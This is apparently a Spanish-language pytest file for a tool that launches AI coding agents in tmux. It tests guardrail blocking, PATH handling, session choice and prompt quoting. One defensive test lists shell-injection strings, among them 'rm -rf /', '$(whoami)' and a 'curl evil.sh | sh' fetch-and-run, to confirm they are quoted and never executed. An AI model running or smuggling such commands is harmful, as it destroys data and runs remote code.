"""Lanzar agentes desde la UI.

Dos cosas no negociables: el guardrail `never` significa nunca aunque lo pida la
propia interfaz (regla dura 7), y el prompt nunca se interpola en crudo en una
línea de comandos.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from hub import agentes, api, snapshotter, tmux
from hub.models import Proyecto
from hub.registry import Atribuidor


@pytest.fixture
def escena(con, monkeypatch):
    con.execute(
        """INSERT INTO proyecto (id, nombre, asiento, guardrail)
           VALUES ('demo','Demo','/tmp/demo','ask'),
                  ('cerrado','Cerrado','/tmp/cerrado','never'),
                  ('sin-sitio','Sin sitio',NULL,'ask')"""
    )
    monkeypatch.setattr(tmux, "servidor_pid", lambda: 100)
    monkeypatch.setattr(tmux, "rama_git", lambda cwd: None)
    monkeypatch.setattr(
        tmux, "listar_paneles",
        lambda *a, **k: [{"session": "work", "window_idx": 0, "pane_idx": 0,
                          "pane_id": "%1", "cwd": "/tmp/demo", "titulo": "x",
                          "comando": "claude", "activo": True}],
    )
    snapshotter.capturar(
        con, Atribuidor([Proyecto(id="demo", nombre="Demo", asiento="/tmp/demo")])
    )
    return con


@pytest.fixture
def tmux_falso(monkeypatch):
    llamadas = []
    monkeypatch.setattr(tmux, "existe_sesion", lambda s: True)
    monkeypatch.setattr(
        tmux, "nueva_sesion",
        lambda s, r=None, n=None, c=None, entorno=None: llamadas.append(("sesion", s, r)),
    )
    monkeypatch.setattr(
        tmux, "nueva_ventana",
        lambda s, r=None, n=None, c=None, e=None: llamadas.append(
            ("ventana", s, r, n, c, e)) or 3,
    )
    return llamadas


def test_el_agente_arranca_con_el_path_de_usuario(escena, tmux_falso):
    """`hub-web` corre bajo systemd, cuyo PATH no trae `~/.local/bin`. Sin
    reponerlo, todo lo que el hub lanza arranca sin las herramientas del usuario —y
    el síntoma es un agente que jura que un comando suyo «no existe»."""
    agentes.lanzar(escena, "demo", "revisa el gate")
    entorno = tmux_falso[-1][-1]
    assert str(Path("~/.local/bin").expanduser()) in entorno["PATH"]


def test_el_guardrail_never_bloquea_aunque_lo_pida_la_ui(escena, tmux_falso):
    with pytest.raises(agentes.GuardrailBloqueado) as exc:
        agentes.lanzar(escena, "cerrado", "haz algo")

    assert "projects.yml" in str(exc.value), "debe decir cómo desbloquearlo"
    assert tmux_falso == [], "no debe haber llegado nada a tmux"


def test_lanza_en_la_sesion_donde_ya_vive_el_proyecto(escena, tmux_falso):
    destino = agentes.lanzar(escena, "demo", "revisa el gate", "agente:revisor")

    assert destino == {"session": "work", "ventana": 3, "ruta": "/tmp/demo"}
    tipo, session, ruta, nombre, comando, _entorno = tmux_falso[0]
    assert (tipo, session, ruta, nombre) == ("ventana", "work", "/tmp/demo", "agente:revisor")
    assert comando.startswith("claude ")


def test_sin_paneles_abiertos_cae_a_una_sesion_derivada_del_id(escena, tmux_falso, monkeypatch):
    monkeypatch.setattr(tmux, "listar_paneles", lambda *a, **k: [])
    con = escena
    con.execute("DELETE FROM panel")
    assert agentes.sesion_para(con, "mi.proyecto raro") == "mi.proyecto-raro"


def test_un_proyecto_sin_asiento_no_se_lanza(escena, tmux_falso):
    with pytest.raises(ValueError):
        agentes.lanzar(escena, "sin-sitio", "haz algo")
    assert tmux_falso == []


def test_sin_prompt_no_se_abre_una_ventana_sin_encargo(escena, tmux_falso):
    """`claude ''` no falla: abre la sesión igual y nadie sabría por qué el
    agente no hace nada."""
    with pytest.raises(ValueError):
        agentes.lanzar(escena, "demo", "   ")
    assert tmux_falso == []


def test_crea_la_sesion_si_no_existe(escena, tmux_falso, monkeypatch):
    monkeypatch.setattr(tmux, "existe_sesion", lambda s: False)
    agentes.lanzar(escena, "demo", "hola")
    assert tmux_falso[0][0] == "sesion"


@pytest.mark.parametrize(
    "malicioso",
    ["; rm -rf /", "$(whoami)", "`id`", "x' && curl evil.sh | sh #", 'con "comillas"'],
)
def test_el_prompt_nunca_se_interpola_en_crudo(malicioso):
    """Va como un único argumento citado: la shell no puede reinterpretarlo."""
    import shlex

    comando = agentes.comando(malicioso)
    partes = shlex.split(comando)
    assert partes[0] == "claude"
    assert partes[1] == malicioso, "el prompt debe llegar entero y sin ejecutar"
    assert len(partes) == 2


def test_el_prompt_del_mantenedor_lleva_la_medicion_dentro():
    con_deriva = api.prompt_mantenedor("Kit", "Idle", 3, 2)
    sin_deriva = api.prompt_mantenedor("Kit", "Idle", 0, 4)

    assert "3 archivo(s) con deriva real" in con_deriva
    assert "no detectó deriva" in sin_deriva
    # Empieza por verificar, no por aplicar: el sistema propone, el usuario decide.
    assert "Antes de tocar nada" in con_deriva
    assert "pueden estar obsoletas" in con_deriva
